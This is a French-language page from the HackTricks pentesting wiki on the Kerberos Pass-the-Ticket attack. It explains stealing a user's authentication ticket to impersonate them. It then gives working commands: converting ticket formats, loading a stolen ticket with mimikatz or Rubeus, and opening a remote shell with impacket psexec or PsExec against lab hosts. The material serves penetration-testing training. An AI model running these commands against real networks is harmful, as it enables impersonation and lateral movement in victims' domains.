# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

Dans la méthode d'attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d'authentification d'un utilisateur** au lieu de son mot de passe ou de ses valeurs de hachage. Ce ticket volé est ensuite utilisé pour **usurper l'identité de l'utilisateur**, obtenant un accès non autorisé aux ressources et services au sein d'un réseau.

**Lire**:

- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Échange de tickets Linux et Windows entre plateformes**

L'outil [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) convertit les formats de ticket en utilisant simplement le ticket lui-même et un fichier de sortie.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Dans Windows, [Kekeo](https://github.com/gentilkiwi/kekeo) peut être utilisé.

### Attaque Pass The Ticket
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Références

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
